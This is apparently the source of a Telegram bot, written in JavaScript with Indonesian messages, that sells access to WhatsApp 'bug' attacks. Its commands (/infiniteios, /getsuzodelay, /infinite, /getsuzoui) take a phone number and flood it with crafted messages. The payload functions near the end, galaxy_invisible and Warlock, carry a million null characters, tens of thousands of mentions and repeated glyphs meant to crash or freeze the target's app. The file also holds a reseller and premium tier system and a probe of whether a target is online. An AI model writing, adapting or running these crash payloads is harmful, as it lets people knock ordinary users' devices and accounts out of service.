│🎭 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : @RenzzDevzzzzzzzz
║▬▭▬▭▬▭▬▭▬▭
│▢ Version : ${versi}
║▢ Runtime : ${sys.uptime}
│▢ RAM     : ${sys.ram}
║▢ CPU     : ${sys.cpu}%
│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
║›Getzuzo Zhiro ©Copyright
╰━━━━━━━━━━━━━━━━━━━━━⬣
`;

  const keyboard = {
   inline_keyboard: [
    [
      { 
        text: "「 𝐗𝐏𝐋𝐎𝐈𝐓 」", 
        callback_data: "bug_menu" 
      }, 
      { 
        text: "「 𝐒𝐎𝐔𝐑𝐂𝐄 」", 
        callback_data: "dev_menu"
      }
    ],
    [
      { 
        text: "𝗦𝘆𝘀𝘁𝗲𝗺", 
        callback_data: "system_menu" 
      }
    ], 
    [
      {
        text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", 
        url: "https://t.me/SanzzChannel" 
      }
    ],
  ],
};
  
const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard, });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});


//=================================================\\
bot.command("infiniteios", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply("❗ Contoh:\n/infiniteios 628xxxx");

  if (!isActiveUser(ownerUsers, userId)) {
    if (isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
    }
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto(prosesImg, {
    caption: `
 𝐏𝐫𝐨𝐜𝐜𝐞𝐬 𝐁𝐮𝐠... 
Target: ${q}
Type: Crash Ios Click
Status: Sending`,
    parse_mode: "Markdown",
  });
  
  console.log("\x1b[32m[BOT]\x1b[0m PROSES MENGIRIM BUG");

  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();

  for (let i = 0; i < 100; i++) {
     await XheavensdeeP(target)
     await sleep(200);
     await IosInvisibleForce(target)
     await IosInvisibleForce(target)
  }
  
  console.log("\x1b[32m[BOT]\x1b[0m BUG BERHASIL DIKIRIM!");

  await ctx.editMessageCaption(
    `
 𝐒𝐮𝐜𝐜𝐞𝐬 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠
Target: ${q}
Type: Crash Ios Click
Status: Sukses`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "проверить цели", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});


bot.command("getsuzodelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply("❗ Contoh:\n/getsuzodelay 628xxxx");

  if (!isActiveUser(ownerUsers, userId)) {
    if (isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
    }
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto(prosesImg, {
    caption: `
 𝐏𝐫𝐨𝐜𝐜𝐞𝐬 𝐁𝐮𝐠.... 
Target: ${q}
Type: Delay Hard
Status: Sending`,
    parse_mode: "Markdown",
  });
  
  console.log("\x1b[32m[BOT]\x1b[0m PROSES MENGIRIM BUG");

  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();

  for (let i = 0; i < 200; i++) {
    await Dellay6(target, true)
    await Dellay4(target);
    await sleep(1000);
    await galaxy_invisible(target);
    await sleep(800);
    await DelayInvisible(target);
    await sleep(1000);
    await Dellay4(target);
    await sleep(1000);
    await Dellay1(target, true)
    await sleep(1000);
    await galaxy_invisible(target);
    await Dellay4(target);
    await sleep(1000);
  }
  
  console.log("\x1b[32m[BOT]\x1b[0m BUG BERHASIL DIKIRIM!");

  await ctx.editMessageCaption(
    `
 𝐒𝐮𝐜𝐜𝐞𝐬 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠
Target: ${q}
Type: Delay Hard
Status: Sukses`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "проверить цели", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.command("infinite", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply("❗ Contoh:\n/infinite 628xxxx");

  if (!isActiveUser(ownerUsers, userId)) {
    if (isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
    }
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto(prosesImg, {
    caption: `
 𝐏𝐫𝐨𝐜𝐜𝐞𝐬 𝐁𝐮𝐠... 
Target: ${q}
Type: Crash Infinite Click
Status: Sending`,
    parse_mode: "Markdown",
  });
  
  console.log("\x1b[32m[BOT]\x1b[0m PROSES MENGIRIM BUG");

  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();

  for (let i = 0; i < 100; i++) {
     await Forceinfinite(target)
     await sleep(500);
     await GetsuzoCompany(target)
     await InvisibleInfinite(target)
     await sleep(200);
     await XheavensdeeP(target)
  }
  
  console.log("\x1b[32m[BOT]\x1b[0m BUG BERHASIL DIKIRIM!");

  await ctx.editMessageCaption(
    `
 𝐒𝐮𝐜𝐜𝐞𝐬 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠
Target: ${q}
Type: Crash Infinite Click
Status: Sukses`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "проверить цели", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});


bot.command("getsuzoui", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply("❗ Contoh:\n/getsuzoui 628xxxx");

  if (!isActiveUser(ownerUsers, userId)) {
    if (isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
    }
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto(prosesImg, {
    caption: `
 𝐏𝐫𝐨𝐜𝐜𝐞𝐬 𝐁𝐮𝐠.... 
Target: ${q}
Type: Crash Ui
Status: Sending`,
    parse_mode: "Markdown",
  });
  
  console.log("\x1b[32m[BOT]\x1b[0m PROSES MENGIRIM BUG");

  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();

  for (let i = 0; i < 2; i++) {
    await Getsuzo(target)
  }
  
  console.log("\x1b[32m[BOT]\x1b[0m BUG BERHASIL DIKIRIM!");

  await ctx.editMessageCaption(
    `
 𝐒𝐮𝐜𝐜𝐞𝐬 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠
Target: ${q}
Type: Crash Ui
Status: Sukses`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "проверить цели", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

//=================================================\\
bot.command("cek", checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("❗ Contoh:\n/cek 628xxxxxxxxx");

  const nomor = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const idPesan = crypto.randomBytes(8).toString("hex");

  try {
    const sent = await sock.sendMessage(nomor, {
      text: "Cek status...",
    }, { messageId: idPesan });

    let status = sent?.status;
    let info = "";

    if (status === 1) {
      info = "✅ *Centang 1* (Target sedang offline)";
    } else if (status === 2) {
      info = "✅ *Centang 2* (Target sedang online)";
    } else {
      info = "❌ Gagal cek status (mungkin nomor tidak aktif atau diblokir)";
    }

    await ctx.reply(`🔍 *Hasil Pengecekan WhatsApp:*\n• Nomor: ${q}\n• Status: ${info}`, {
      parse_mode: "Markdown"
    });

  } catch (err) {
    console.error("❌ Gagal mengirim pesan cek:", err);
    ctx.reply("❌ Gagal mengecek status, pastikan nomor valid dan terhubung ke WhatsApp.");
  }
});

bot.command("grouponly", (ctx) => {
  const senderId = ctx.from.id.toString();

  if (!isValidOwner(senderId)) return;

  const arg = ctx.message.text.split(" ")[1];
  if (!["on", "off"].includes(arg)) {
    return ctx.reply("❗ Gunakan:\n/grouponly on\n/grouponly off");
  }

  const status = arg === "on";
  saveGroupConfig({ isGroupOnly: status });
  ctx.reply(`✅ Mode Grouponly sekarang: ${status ? "Aktif ✅" : "Nonaktif ❌"}`);
});

bot.command("setjeda", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const duration = args[1]?.trim();

  if (!duration) {
    return ctx.reply("❗ Contoh penggunaan:\n/setjeda 60s\n/setjeda 2m");
  }

  const seconds = parseCooldownDuration(duration); 
  if (seconds === null) {
    return ctx.reply(
      "❌ Format durasi tidak valid.\nGunakan:\n/setjeda <durasi>\nContoh:\n/setjeda 60s (60 detik)\n/setjeda 10m (10 menit)"
    );
  }

  const cooldownData = loadCooldownData(); 
  cooldownData.defaultCooldown = seconds;
  saveCooldownData(cooldownData);

  const displayTime = seconds >= 60
    ? `${Math.floor(seconds / 60)} menit`
    : `${seconds} detik`;

  await ctx.reply(`✅ Cooldown global berhasil diatur ke ${displayTime}`);
});

bot.command("broadcast", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const dbFile = "./DatabaseUser/userlist.json";

  if (senderId !== "8488114208") return;

  const replyMsg = ctx.message.reply_to_message;
  if (!replyMsg) return ctx.reply("❗ Balas pesan yang ingin kamu broadcast.");

  let db = { private: [], group: [] };
  try {
    db = JSON.parse(fs.readFileSync(dbFile));
  } catch (e) {
    return ctx.reply("❌ Gagal membaca data user.");
  }

  const users = db.private || [];
  const groups = db.group || [];
  const allReceivers = [...users, ...groups];

  let successCount = 0;
  let failedCount = 0;

  for (const id of allReceivers) {
    try {
      await ctx.telegram.forwardMessage(id, ctx.chat.id, replyMsg.message_id);
      successCount++;
    } catch (err) {
      failedCount++;
      console.log(`❌ Gagal kirim ke ${id}:`, err.description);
    }
  }

  const info = `✅ Broadcast selesai.

📩 Total User: ${users.length}
👥 Total Grup: ${groups.length}
📬 Terkirim: ${successCount}
❌ Gagal: ${failedCount}`;

  await ctx.reply(info);
});

bot.command("setmaintenance", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== BOT_OWNER_ID) return;

  const args = ctx.message.text.split(" ");
  const status = args[1];

  if (!["on", "off"].includes(status)) {
    return ctx.reply("❗ Contoh:\n/setmaintenance on bot sedang diperbarui\n/setmaintenance off");
  }

  const message = status === "on"
    ? args.slice(2).join(" ") || "⚠️ Bot sedang dalam maintenance. Silakan coba lagi nanti."
    : "";

  const success = await setMaintenanceStatus(status, message);

  if (success) {
    ctx.reply(`✅ Mode maintenance: *${status.toUpperCase()}*\n${message}`, { parse_mode: "Markdown" });
  } else {
    ctx.reply("❌ Gagal update maintenance.");
  }
});

bot.command("setversi", async (ctx) => {
  const senderId = ctx.from.id.toString();
  if (senderId !== BOT_OWNER_ID2) return;

  const arg = ctx.message.text.split(" ")[1];
  if (!arg) return ctx.reply("❗ Gunakan:\n/setversi 6.0");

  const success = await updateBotVersion(arg);
  if (success) {
    ctx.reply(`✅ Versi bot berhasil diperbarui ke *${arg}*`, { parse_mode: "Markdown" });
  } else {
    ctx.reply("❌ Gagal memperbarui versi bot.");
  }
});

bot.command("addbl", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya developer yang dapat menjalankan perintah ini.");

  const targetId = ctx.message.text.split(" ")[1];
  if (!targetId) return ctx.reply("❗ Contoh: /addbl 123456789");

  const success = await updateGitHubBlacklist((json) => {
    if (!json.blacklist.includes(targetId)) {
      json.blacklist.push(targetId);
    }
    return json;
  });

  ctx.reply(success ? `✅ ID ${targetId} berhasil dimasukkan ke blacklist.` : "❌ Gagal menambahkan ke blacklist.");
});
bot.command("delbl", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya developer yang dapat menjalankan perintah ini.");

  const targetId = ctx.message.text.split(" ")[1];
  if (!targetId) return ctx.reply("❗ Contoh: /delbl 123456789");

  const success = await updateGitHubBlacklist((json) => {
    json.blacklist = json.blacklist.filter((id) => id !== targetId);
    return json;
  });

  ctx.reply(success ? `✅ ID ${targetId} berhasil dihapus dari blacklist.` : "❌ Gagal menghapus dari blacklist.");
});

bot.command("setwelcome", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== "8488114208") return ctx.reply("❌ Fitur ini hanya bisa digunakan oleh developer bot.");

  const arg = ctx.message.text.split(" ")[1];
  if (!arg || !["on", "off"].includes(arg)) {
    return ctx.reply("🛠️ Contoh penggunaan: /setwelcome on | off");
  }

  const config = loadWelcomeConfig();
  config.enabled = arg === "on";
  saveWelcomeConfig(config);

  ctx.reply(`✅ Welcome message telah di-${arg === "on" ? "aktifkan" : "nonaktifkan"}.`);
});

bot.command("ban", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const userId = ctx.message.reply_to_message?.from?.id;
  if (!userId) return ctx.reply("❌ Reply ke user yang ingin diban.");

  try {
    await ctx.telegram.kickChatMember(ctx.chat.id, userId);
    ctx.reply("✅ User berhasil diban.");
  } catch {
    ctx.reply("❌ Gagal memban user.");
  }
});

bot.command("unban", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const userId = ctx.message.reply_to_message?.from?.id;
  if (!userId) return ctx.reply("❌ Reply ke user yang ingin di-unban.");

  try {
    await ctx.telegram.unbanChatMember(ctx.chat.id, userId);
    ctx.reply("✅ User berhasil di-unban.");
  } catch {
    ctx.reply("❌ Gagal unban user.");
  }
});

bot.command("kick", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const userId = ctx.message.reply_to_message?.from?.id;
  if (!userId) return ctx.reply("❌ Reply ke user yang ingin dikick.");

  try {
    await ctx.telegram.kickChatMember(ctx.chat.id, userId);
    await ctx.telegram.unbanChatMember(ctx.chat.id, userId); 
    ctx.reply("✅ User berhasil di-kick.");
  } catch {
    ctx.reply("❌ Gagal kick user.");
  }
});

bot.command("mute", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const [_, dur] = ctx.message.text.split(" ");
  if (!ctx.message.reply_to_message || !dur) return ctx.reply("❌ Contoh: Reply dan /mute 30s, 5m, 1h, atau 2d");

  const seconds = parseCooldownDuration(dur);
  if (!seconds) return ctx.reply("❌ Format durasi salah. Gunakan: 30s, 5m, 1h, atau 2d");

  const userId = ctx.message.reply_to_message.from.id;
  const untilDate = Math.floor(Date.now() / 1000) + seconds;

  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, userId, {
      permissions: { can_send_messages: false },
      until_date: untilDate,
    });
    ctx.reply(`✅ User dimute selama ${dur}`);
  } catch {
    ctx.reply("❌ Gagal mute user.");
  }
});

bot.command("unmute", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const userId = ctx.message.reply_to_message?.from?.id;
  if (!userId) return ctx.reply("❌ Reply ke user yang ingin di-unmute.");

  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, userId, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false,
      },
    });
    ctx.reply("✅ User berhasil di-unmute.");
  } catch {
    ctx.reply("❌ Gagal unmute user.");
  }
});

//=================================================\\
bot.command("addowner", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Format: /addowner <id> <durasi>");

  const targetId = args[1];
  const duration = args[2];

  if (ctx.from.id.toString() !== "8488114208") 
    return ctx.reply("Hanya owner utama.");

  addOwner(targetId, duration);
  ctx.reply(`✅ ID ${targetId} sekarang owner selama ${duration}`);
});

bot.command("addadmin", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Format: /addadmin <id> <durasi>");

  const targetId = args[1];
  const duration = args[2];

  if (!isActiveUser(ownerUsers, senderId))
    return ctx.reply("❌ Hanya owner yang bisa menambah admin.");

  addAdmin(targetId, duration);
  ctx.reply(`✅ ID ${targetId} sekarang admin selama ${duration}`);
});

bot.command("addprem", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Format: /addprem <id> <durasi>");

  const targetId = args[1];
  const duration = args[2];

  if (!isActiveUser(ownerUsers, senderId) && !isActiveUser(adminUsers, senderId))
    return ctx.reply("❌ Hanya admin/owner yang bisa menambah premium.");

  addPremium(targetId, duration);
  ctx.reply(`✅ ID ${targetId} sekarang premium selama ${duration}`);
});

bot.command("delowner", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Format: /delowner <id>");

  const targetId = args[1];

  if (ctx.from.id.toString() !== "8488114208") 
    return ctx.reply("Hanya owner utama.");

  removeOwner(targetId);
  ctx.reply(`✅ ID ${targetId} sudah dihapus dari owner`);
});

bot.command("delprem", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Format: /delprem <id>");

  const targetId = args[1];

  if (!isActiveUser(ownerUsers, senderId) && !isActiveUser(adminUsers, senderId))
    return ctx.reply("❌ Hanya admin/owner yang bisa menghapus premium.");

  removePremium(targetId);
  ctx.reply(`✅ ID ${targetId} sudah dihapus dari premium`);
});

//=================================================\\
bot.command("addpairing", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return await ctx.reply(
      "❗ Contoh: /addpairing 628xxx");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Silahkan hapus session terlebih dahulu");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "RENZZXML");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `\`\`\`
▢ Kode Pairing...\`\`\`
╰➤ Nomor  : ${phoneNumber} 
╰➤ Kode   : ${formattedCode}
`,

      parse_mode: "Markdown",
      reply_markup: {
         inline_keyboard: [
            [
              { 
                text: "каналы", 
                url: "https://t.me/SanzzChannel"
              },
              {
                text: "каналы", 
                url: "https://t.me/+r55iQVLXEwA1YmQ9"
              }
            ],
         ],
      },
    });
    
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply(
      "❌ Gagal melakukan pairing. Pastikan nomor Whatsapp valid!"
    );
  }
});

bot.command("delsession", checkOwner, checkAdmin, async (ctx) => {
  try {
    await fs.promises.rm('./session', { recursive: true, force: true });

    isWhatsAppConnected = false;
    await ctx.reply("✅ Session berhasil dihapus! Menyambung ulang...");

    await startSesi();
  } catch (err) {
    console.error("❌ Gagal menghapus session:", err);
    await ctx.reply("❌ Gagal menghapus session. Coba cek folder atau permission.");
  }
});

//=================================================\\
// MOD management (developer only)
bot.command("addmod", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: /addmod 123456789");

  const success = await updateGitHubJSON(modPath, (json) => {
    if (!json.mod) json.mod = [];
    if (!json.mod.includes(id)) json.mod.push(id);
    return json;
  });

  ctx.reply(success ? `✅ MOD ${id} ditambahkan.` : "❌ Gagal menambah MOD.");
});

bot.command("delmod", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: /delmod 123456789");

  const success = await updateGitHubJSON(modPath, (json) => {
    if (!json.mod) json.mod = [];
    json.mod = json.mod.filter((m) => m !== id);
    return json;
  });

  ctx.reply(success ? `✅ MOD ${id} dihapus.` : "❌ Gagal menghapus MOD.");
});

// PT management (developer only)
bot.command("addpt", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isMODorDev(userId))) return ctx.reply("❌ Hanya MOD & Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: /addpt 123456789");

  const success = await updateGitHubJSON(ptPath, (json) => {
    if (!json.pt) json.pt = [];
    if (!json.pt.includes(id)) json.pt.push(id);
    return json;
  });

  ctx.reply(success ? `✅ PT ${id} ditambahkan.` : "❌ Gagal menambah PT.");
});

bot.command("delpt", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isMODorDev(userId))) return ctx.reply("❌ Hanya MOD & Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: /delpt 123456789");

  const success = await updateGitHubJSON(ptPath, (json) => {
    if (!json.pt) json.pt = [];
    json.pt = json.pt.filter((r) => r !== id);
    return json;
  });

  ctx.reply(success ? `✅ PT ${id} dihapus.` : "❌ Gagal menghapus PT.");
});

bot.command("addreseller", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isPTorDev(userId))) return ctx.reply("❌ Hanya PT & Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: /addreseller 123456789");

  const success = await updateGitHubJSON(resellerPath, (json) => {
    if (!json.resellers) json.resellers = [];
    if (!json.resellers.includes(id)) json.resellers.push(id);
    return json;
  });

  ctx.reply(success ? `✅ Reseller ${id} ditambahkan.` : "❌ Gagal menambah reseller.");
});

bot.command("delreseller", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isPTorDev(userId))) return ctx.reply("❌ Hanya PT & Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: /delreseller 123456789");

  const success = await updateGitHubJSON(resellerPath, (json) => {
    json.resellers = (json.resellers || []).filter((r) => r !== id);
    return json;
  });

  ctx.reply(success ? `✅ Reseller ${id} dihapus.` : "❌ Gagal menghapus reseller.");
});

bot.command("addtoken", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isResellerOrOwner(userId))) return ctx.reply("❌ Hanya reseller & developer yang bisa pakai perintah ini.");

  const token = ctx.message.text.split(" ")[1];
  if (!token) return ctx.reply("❗ Contoh: /addtoken 123456789:ABC...");

  const success = await updateGitHubJSON(tokenPath, (json) => {
    if (!json.tokens.includes(token)) json.tokens.push(token);
    return json;
  });

  ctx.reply(success ? "✅ Token berhasil ditambahkan." : "❌ Gagal menambahkan token.");
});

bot.command("deltoken", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isResellerOrOwner(userId))) return ctx.reply("❌ Hanya reseller & developer yang bisa pakai perintah ini.");

  const token = ctx.message.text.split(" ")[1];
  if (!token) return ctx.reply("❗ Contoh: /deltoken 123456789:ABC...");

  const success = await updateGitHubJSON(tokenPath, (json) => {
    json.tokens = json.tokens.filter((t) => t !== token);
    return json;
  });

  ctx.reply(success ? "✅ Token berhasil dihapus." : "❌ Gagal menghapus token.");
});

bot.command("p", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya Developer yang bisa gunakan perintah ini.");

  // pastikan reply pesan
  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.from) return ctx.reply("❗ Harus reply ke pesan target.");

  // ambil argumen
  const args = ctx.message.text.split(" ").slice(1);
  const nominal = args[0];
  const gelar = args[1] ? args[1].toLowerCase() : null;

  if (!nominal || !gelar) {
    return ctx.reply("❗ Contoh: reply pesan lalu ketik\n/p 100000 reseller");
  }

  // validasi gelar
  const validRoles = ["reseller", "pt", "mod", "member"];
  if (!validRoles.includes(gelar)) {
    return ctx.reply("❌ Role tidak valid. Pilih salah satu: reseller, pt, mod, member");
  }

  const username = reply.from.username ? `@${reply.from.username}` : reply.from.id;
  const formatted = `${username} ${formatNominal(Number(nominal))} ${gelar.charAt(0).toUpperCase() + gelar.slice(1)}`;

  // simpan ke GitHub
  const success = await updateGitHubJSON(paymentPath, (json) => {
    if (!json.payments) json.payments = [];
    json.payments.push(formatted);
    return json;
  });

  ctx.reply(success ? `✅ Data tersimpan:\n${formatted}` : "❌ Gagal menyimpan data.");
});

bot.command("list", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya Developer yang bisa gunakan perintah ini.");
  
  try {
    const url = `https://raw.githubusercontent.com/${githubOwner1}/${githubRepo1}/main/${paymentPath}`;
    const { data } = await axios.get(url);
    const payments = data.payments || [];

    if (payments.length === 0) {
      return ctx.reply("📂 Belum ada data tersimpan.");
    }

    const listText = payments
      .map((p, i) => `${i + 1}. ${p}`)
      .join("\n");

    ctx.reply(`📜 Daftar Member Script:\n\n${listText}`);
  } catch (e) {
    console.error("Gagal ambil list:", e.message);
    ctx.reply("❌ Gagal mengambil data list.");
  }
});

//=================================================\\
async function galaxy_invisible(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "Hama", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`
              )
            ],
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: `@rizxvelzinfinity${"𑇂𑆵𑆴𑆿".repeat(60000)}`
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
}

async function Warlock(target) {
  const selectedMedia = mediaData[sequentialIndex];

  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const MD_ID = selectedMedia.ID;
  const MD_Uri = selectedMedia.uri;
  const MD_Buffer = selectedMedia.buffer;
  const MD_SID = selectedMedia.sid;
  const MD_sha256 = selectedMedia.SHA256;
  const MD_encsha25 = selectedMedia.ENCSHA256;
  const mkey = selectedMedia.mkey;

  let parse = true;
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
          fileSha256: MD_sha256,
          fileEncSha256: MD_encsha25,
          mediaKey: mkey,
          mimetype: type,
          directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1000 * 40 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

